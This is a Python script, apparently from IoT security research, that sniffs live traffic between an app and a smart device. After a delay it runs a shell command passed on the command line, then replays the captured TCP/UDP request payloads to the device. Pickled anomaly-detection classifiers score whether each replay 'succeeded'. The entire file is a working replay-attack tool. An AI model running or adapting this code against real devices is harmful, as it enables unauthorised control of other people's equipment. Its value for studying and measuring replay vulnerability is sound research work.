import collections
import math
import string
import sys

import numpy as np
import pyshark
from threading import Thread
from time import sleep
import socket
import os


class Flow:
    def __init__(self, transport_layer, dst_ip, dst_port, list_requests: list, list_responses: list):
        self.transport_layer = transport_layer
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.list_requests = list_requests
        self.list_responses = list_responses

    def printFlow(self):
        info = 'transport_layer=%s --- dst_port=%s --- ip=%s' % (self.transport_layer, self.dst_port, self.dst_ip)
        print(info)


list_flows = collections.deque()
request = False
start_time = 0
interface = str(sys.argv[1])
mac_app = str(sys.argv[2])
mac_device = str(sys.argv[3])
sniffing_time = int(sys.argv[4])
delay_time = int(sys.argv[5])
path_Models = str(sys.argv[6])
cmd = str(sys.argv[7])
filter = '(ether src ' + mac_device + ' and ether dst ' + mac_app + ') or (ether dst ' + mac_device + ' and ether src ' + mac_app + ')'

capture = pyshark.LiveCapture(interface=interface, bpf_filter=filter)

started_thread = False
started_interval = False

############################################################################################################################
from nltk.tokenize import word_tokenize
from sklearn.feature_extraction.text import HashingVectorizer, CountVectorizer, TfidfTransformer
import pickle

clf_svm = pickle.load(open(path_Models+ "/svm.sav", 'rb'))
clf_if = pickle.load(open(path_Models + "/if.sav", 'rb'))
clf_ee = pickle.load(open(path_Models + "/ee.sav", 'rb'))
clf_lo = pickle.load(open(path_Models+ "/lo.sav", 'rb'))
clf_cc = pickle.load(open(path_Models+"/cc.sav", 'rb'))

f = open(path_Models+ "/feature_num.txt", "r")
max_num_features = int(f.read())


def tokenizeText(sample):
    return list(set(word_tokenize(sample)))

def anomaly_detection(payload: string, clf, vectorize:bool):
    X_test= [payload]
    if vectorize:
        vectorizer = HashingVectorizer(n_features=max_num_features, tokenizer=tokenizeText)
        X_test = vectorizer.fit_transform([payload]).toarray()
    y_pred_test = clf.predict(X_test)

    if y_pred_test[0] == -1:
        return False  # NO NOVELTY DETECTECTED
    else:
        return True  # NOVELTY DETECTED






############################################################################################################################

def threaded_function():
    print("START SNIFFING TIME")
    sleep(float(sniffing_time))
    print("END SNIFFING TIME")
    os.system(cmd)



    global started_thread
    global started_interval
    global list_flows
    global request
    started_thread = True
    sleep(float(delay_time))
    print('START REPLAY ATTACK')
    print('#######################################################################################')

    responses_to_test = []
    count_flow = len(list_flows) - 1
    for f in reversed(list_flows):
        # f=list_flows.pop()

        list_requests = f.list_requests
        list_responses = f.list_responses
        if len(list_responses) == 0:
            continue

        buffer_size = len(list_responses[0])
        for r in list_responses:
            if len(r) > buffer_size:
                buffer_size = len(r)

        buffer_size = pow(2, math.ceil(math.log2(buffer_size)))

        socket_used = None
        if f.transport_layer == 'TCP':
            socket_used = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_used.connect((f.dst_ip, int(f.dst_port)))
        if f.transport_layer == 'UDP':
            socket_used = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            socket_used.connect((f.dst_ip, int(f.dst_port)))
        socket_used.settimeout(2)

        for r in list_requests:
            received_payload = ''
            payload = r
            socket_used.send(payload.encode('ISO-8859-1'))  # ISO-8859-1
            # time.sleep(2) #2 secondi
            print('sent payload=' + payload)
            print('****************************************************************')

            try:  # TIMEOUT PER LA RICEZIONE
                received_payload = socket_used.recv(buffer_size)
                # print('received payload=' + received_payload.decode('ISO-8859-1'))
                print('received payload=' + received_payload.decode('ISO-8859-1'))
                print('****************************************************************')

                #################################################################################################
                # check_similarity(payload,list_responses)
                # NUOVO!!!
                # if count_flow==command_flow_num:
                received_payload = received_payload.decode('ISO-8859-1').replace("/", "").replace("+", "")
                responses_to_test.append(received_payload)

                # NON HO BISOGNO DI VERIFICARE LA SIMILARITà SE IL FLUSSO NON è QUELLO DEL COMANDO!
                #################################################################################################

            except socket.timeout as e:
                err = e.args[0]
                # this next if/else is a bit redundant, but illustrates how the
                # timeout exception is setup
                # if err == 'timed out':
                # print('REPLAY ATTACK NOT WORKED: TIME EXPIRED')

            except Exception as e1:
                print(e1)
                print('REPLAY ATTACK NOT WORKED: GENERIC ERROR')

                continue


        # COME HA SUCCESSO IL REPLAY ATTACK? VERIFICO SE MI ARRIVA LA RISPOSTA OPPURE VERIFICO SE QUELLA CHE MI ARRIVA è UGUALE A QUELLA CHE HO

    ####################################################################################
    # NUOVO!!!
    # response_to_test=findCommandsResponses(responses_to_test)
    ###################################################################################
    count=0
    for clf in [clf_svm, clf_if, clf_ee, clf_lo, clf_cc]:
        if len(responses_to_test) == 0:
            print("NO RESPONSE AVAILABLE: REPLAY ATTACK NOT SUCCESSFUL")
            break
        result = False
        if len(responses_to_test) > 3:
            responses_to_test = responses_to_test[0:3]
        for res in responses_to_test:
            if count<4:
                if anomaly_detection(res, clf, vectorize=True):
                    result = True
                    break
            else:
                if anomaly_detection(res, clf, vectorize=False):
                    result = True
                    break
        if result:
            print('REPLAY ATTACK SUCCESSFUL WITH CLF=' + str(clf))
        else:
            print('REPLAY ATTACK NOT SUCCESSFUL WITH CLF=' + str(clf))

        count+=1

    list_flows = collections.deque()
    print("END REPLAY ATTACK")
    started_thread = False
    started_interval = False
    request = False


# capture.apply_on_packets(packet_callback)
for packet in capture.sniff_continuously():

    if started_thread == True:
        continue

    try:
        if packet.transport_layer == None:  # ASSUNZIONE: I PACCHETTI SCAMBIATI CON IL DEVICE HANNO UN LIVELLO DI TRASPORTO
            continue
        payload = ''
        if str(packet.transport_layer) == 'UDP':
            if packet.udp._all_fields.get("udp.payload") == None:
                continue
            payload = packet.udp._all_fields["udp.payload"].replace(":", "")
        if str(packet.transport_layer) == 'TCP':
            if packet.tcp._all_fields.get("tcp.payload") == None:
                continue
            payload = packet.tcp._all_fields["tcp.payload"].replace(":", "")
        if payload == '':
            print('ERROR')

        if len(payload) == 0:
            continue

        payload = bytes.fromhex(payload).decode('ISO-8859-1')

        print(payload)

        if str(packet.eth._all_fields['eth.src']) == str(mac_app) and str(packet.eth._all_fields['eth.dst']) == str(
                mac_device):

            if not request:
                request = True
                flow = Flow(packet.transport_layer, packet.ip.dst, packet[packet.transport_layer].dstport, [], [])
                flow.list_requests.append(payload)
                list_flows.append(flow)
            else:
                current_flow = list_flows[len(list_flows) - 1]
                current_flow.list_requests.append(payload)
                list_flows[len(list_flows) - 1] = current_flow
            continue

            # DOUBLE CHECK: check if the source port of the app is the same of the destination port of the response

            # if str(packet.ip.src) == str(device_ip_address) and (multicast_address_check(str(packet.ip.dst))==True or
            # str(packet.ip.dst) == str(phone_ip_address) or
            # str(packet.ip.dst) == '255.255.255.255'):

        if str(packet.eth._all_fields['eth.src']) == str(mac_device) and str(packet.eth._all_fields['eth.dst']) == str(
                mac_app):

            # pck = Packet(packet.transport_layer, packet.highest_layer, packet.ip.dst, packet[packet.transport_layer].srcport,payload,timestamp)
            # print(pck.printConvertedPayload())

            if len(list_flows) == 0:
                # print('FOUND RESPONSE FIRST')  # I MAY IGNORE THIS CASE!
                continue
                # sys.exit(0)
            current_flow = list_flows[len(list_flows) - 1]
            if request:
                request = False
                current_flow.list_responses = []
            current_flow.list_responses.append(payload)
            list_flows[len(list_flows) - 1] = current_flow
            # print(len(list_flows))
            # print(started_interval)
            if len(list_flows) == 1 and not started_interval:
                # print("Started Thread")
                # started_thread=True
                # start_time=time.time()
                started_interval = True
                thread = Thread(target=threaded_function)
                thread.start()
            continue



    except AttributeError as e:
        print(e)
        continue
